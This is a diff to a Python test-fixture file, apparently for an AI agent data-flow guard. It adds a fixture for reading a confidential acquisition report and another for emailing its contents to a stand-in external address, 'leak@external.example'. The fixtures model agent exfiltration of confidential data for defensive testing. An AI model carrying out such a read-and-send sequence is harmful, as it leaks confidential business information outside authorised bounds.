@@ -129,6 +129,41 @@ def internal_send(**overrides: Any) -> dict[str, Any]:
     return payload
 
 
+def acquisition_read(**overrides: Any) -> dict[str, Any]:
+    """Read of the confidential acquisition report (data-flow fixture)."""
+    payload: dict[str, Any] = {
+        "request_id": "req-acquisition",
+        "actor_id": "agent-1",
+        "session_id": "sess-dataflow",
+        "tool_name": "file_tool",
+        "operation": "read",
+        "arguments": {"path": "/internal/acquisition_report.pdf"},
+        "data_classification": "confidential",
+    }
+    payload.update(overrides)
+    return payload
+
+
+def confidential_send(**overrides: Any) -> dict[str, Any]:
+    """Outbound e-mail defaulting to the required unapproved external target."""
+    payload: dict[str, Any] = {
+        "request_id": "req-confidential-send",
+        "actor_id": "agent-1",
+        "session_id": "sess-dataflow",
+        "tool_name": "email_tool",
+        "operation": "send",
+        "arguments": {
+            "recipient": "leak@external.example",
+            "subject": "Acquisition report",
+            "body": "Indicative offer 4.2M USD.",
+        },
+        "destination": "leak@external.example",
+        "data_classification": "confidential",
+    }
+    payload.update(overrides)
+    return payload
+
+
 def restricted_transfer(**overrides: Any) -> dict[str, Any]:
     payload: dict[str, Any] = {
         "request_id": "req-transfer",
